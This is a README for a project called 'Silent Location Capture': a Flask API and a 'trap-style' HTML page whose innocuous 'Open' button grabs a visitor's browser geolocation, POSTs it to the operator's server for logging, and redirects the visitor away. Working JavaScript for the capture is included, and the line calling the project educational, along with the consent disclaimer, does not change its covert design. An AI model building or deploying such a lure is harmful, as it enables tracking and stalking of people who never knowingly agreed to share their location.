# Silent Location Capture

A minimalistic backend API to silently capture a user's geolocation upon page access — with no interface, only raw data.

## Overview

This project is a simple geolocation capture system consisting of two parts:

1. **Backend**: A Flask-based REST API that listens for incoming geolocation data and logs it into a file.
2. **Frontend (HTML)**: A trap-style page with a button that, when clicked, silently captures the user's current geolocation and sends it to the backend.

The intent of this project is educational — to demonstrate how geolocation can be programmatically captured and sent to a server with minimal user interaction.

⚠️ **Disclaimer**: Use this responsibly. Always get proper consent when handling geolocation or personal data.

## How It Works

### HTML (Frontend)

When a user opens the HTML page and clicks the button:

- The browser requests their geolocation.
- If permission is granted, the coordinates are sent via `POST` to the backend endpoint `/lokasi`.
- After sending, the user is redirected to another site (you can customize this).

```html
<button onclick="getLocation()">Open</button>

<script>
  function getLocation() {
    navigator.geolocation.getCurrentPosition(
      function(pos) {
        fetch("http://localhost:5000/lokasi", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            latitude: pos.coords.latitude,
            longitude: pos.coords.longitude
          })
        })
        .then(() => {
          window.location.href = "https://example.com";
        });
      },
      function(err) {
        alert("Location access denied.");
      }
    );
  }
</script>
```
### Python (Backend)
The backend API is built with Flask. It:
- Accepts geolocation data via the /lokasi endpoint.
- Saves the data (timestamp, latitude, longitude) into a local lokasi.txt file.
- Supports CORS for cross-origin requests

# Getting Started

## Requirements

- Python 3  
- Flask  
- Flask-CORS  

## Installation

```bash
pip install flask flask-cors
python app.py
```

```markdown
> 🛠️ Maintained by gmptrizki
```

![image](https://github.com/user-attachments/assets/f15a83f6-8ada-4a75-afb3-5afb96bbc861)

![image](https://github.com/user-attachments/assets/2cbea02f-3e8c-46c1-85fb-9f5db9e46855)



